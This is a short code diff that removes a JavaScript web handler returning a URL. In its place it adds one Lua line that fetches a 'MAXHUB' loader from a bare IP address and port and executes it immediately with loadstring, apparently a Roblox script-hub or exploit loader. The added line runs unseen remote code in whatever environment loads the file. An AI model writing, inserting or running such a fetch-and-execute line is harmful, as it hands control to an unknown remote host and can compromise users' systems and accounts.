@@ -1,4 +1,1 @@
-export default function handler(req, res) {
-  res.setHeader("Content-Type", "text/plain");
-  res.status(200).send("https://example.com");
-}
+loadstring(game:HttpGet("http://193.149.164.213:1044/maxnrzblox/MAXHUB/refs/heads/main/loader"))()
